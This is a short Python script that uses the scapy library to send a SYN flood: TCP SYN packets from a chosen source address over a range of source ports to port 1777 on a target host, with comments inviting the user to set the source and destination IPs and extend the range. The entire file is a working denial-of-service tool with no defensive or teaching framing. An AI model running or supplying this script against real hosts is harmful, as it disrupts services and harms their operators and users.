from scapy.layers.inet import TCP, ICMP, IP
from scapy.sendrecv import send


def synflood(s, d):
    for sourcePort in range(11000, 11200): # 65000 come finale
        iplayer = IP(src=s, dst=d)
        tcplayer = TCP(sport=sourcePort, dport=1777, flags="S")
        send(iplayer/tcplayer)


src = "192.168.1.12"  # Change to the src ip
dst = "192.168.1.5"  # Change to the dst ip
synflood(src, dst)
